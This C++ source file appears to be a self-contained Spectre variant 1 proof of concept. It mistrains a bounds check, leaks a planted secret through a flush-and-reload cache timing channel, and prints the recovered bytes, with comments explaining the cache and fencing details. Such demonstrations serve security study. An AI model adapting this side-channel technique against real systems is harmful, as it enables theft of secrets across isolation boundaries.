// Compile: g++ -O{1, 2} main.cpp -o main
// Run: ./main 160 2
#include <stdio.h>
#include <x86intrin.h>

using u8 = unsigned char;
using u32 = unsigned int;
using u64 = unsigned long long;

// Every data structure (more or less) is page aligned to throttle prefetchers.
// This is slightly problematic because 4096 aligned accesses are all going to target
// the same set in L1, so if the secret happens to be more than 8b in an 8-way/32-KiB
// L1D, then we'd lose some characters. But here we're banking on L2 misses rather than
// L1. On Skylake-X the L2 cache is 16-way associative totaling 1 MiB in size. The
// critical stride works out to be (1024 KiB << 10) / 16 = 65,536 bytes. We'd select
// the same L2 set only when accesses are 65,536 bytes apart.
#define PAGE_SZ 0x1000

// Keep the bound in memory so we can flush it later. We want to introduce the load
// latency while evaluating the branch condition in 'get_value' to force the predictor
// to speculate and take the branch after training.
alignas(PAGE_SZ) volatile u64 LIMIT = 4;

alignas(PAGE_SZ) u8 covert[256 * PAGE_SZ];
alignas(PAGE_SZ) const char* secret_space = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
alignas(PAGE_SZ) char store[27] = {0};

volatile u8 sink = 0;

alignas(PAGE_SZ) struct Data {
    u8 values[4] = {1, 2, 3, 4};            // 'get_value' doesn't guard this.
    char secret[4] = {'B', 'E', 'N', 'T'};  // 'get_value' does guard this.
} S;

u8 get_value(int idx, u8* covert) {
    if (idx < LIMIT) {
        // Every PAGE_SZ * S.values[idx] maps to a unique page in 'covert'.
        // Stream prefetchers don't cross page boundaries, so we are guaranteed
        // that accessing PAGE_SZ * 'B' won't accidentally prefetch PAGE_SZ * 'C'.
        // Accesses PAGE_SZ * ord('A'..'Z') touch memory in the range (base + 266'240)
        // to (base + 368'640) where 'base' is the base address of 'covert'. This is
        // fine because 'covert' spans over 256 distinct pages: from (base + 0) to
        // (base + 1'048'576).
        u8 v1 = covert[PAGE_SZ * (S.values[idx])];
        u8 v2 = covert[PAGE_SZ * (S.values[idx + 1])];
        u8 v3 = covert[PAGE_SZ * (S.values[idx + 2])];
        u8 v4 = covert[PAGE_SZ * (S.values[idx + 3])];
        return (v1 << v2) ^ (v3 << v4);
    }
    return 0;
}

// LFENCE pins rdtsc before/after the load so the measured interval actually
// covers the load. Without the fence, nothing stops rdtsc from reordering
// with the load without fences. We don't want that.
inline u32 probe_latency(u8* addr) {
    u64 t0 = __rdtsc();
    _mm_lfence();
    sink += *addr;
    _mm_lfence();
    u64 t1 = __rdtsc();
    return (u32)(t1 - t0);
}

int main(int argc, char** argv) {
    u32 threshold = argc > 1 ? atoi(argv[1]) : 120;
    u32 hit_threshold = argc > 2 ? atoi(argv[2]) : 1;
    volatile int sum = 0;

    // Warm up.
    for (int i = 0; i < 256; i++) {
        covert[i * PAGE_SZ] = 1;
    }

    int hits[26] = {0};

    int rounds = 1000;
    for (int r = 0; r < rounds; r++) {
        // Train the predictor toward "taken".
        for (int t = 0; t < 32; t++) {
            sum += get_value(0, covert);
        }

        // Flush the bound and the probe lines.
        _mm_clflush((void*)&LIMIT);
        for (int i = 0; i < 26; i++) {
            _mm_clflush(&covert[PAGE_SZ * (u8)secret_space[i]]);
        }

        // Malign access: idx=4 is out of bounds. The misprediction speculatively
        // reads S.secret through the covert channel. MFENCE prevents all loads
        // and stores from overlapping with the probing load.
        _mm_mfence();
        sum += get_value(4, covert);
        _mm_mfence();

        for (int n = 0; n < 26; n++) {
            u8 c = (u8)secret_space[n];
            u32 latency = probe_latency(&covert[PAGE_SZ * c]);
            hits[n] +=  latency < threshold;
        }
    }

    // A real leaked byte hits on the large majority of rounds.
    int k = 0;
    for (int i = 0; i < 26; i++) {
        if (hits[i] >= hit_threshold) {
            store[k++] = secret_space[i];
        }
    }
    store[k] = 0;

    printf("Recovered bytes: %s\n", store);
    return sum;
}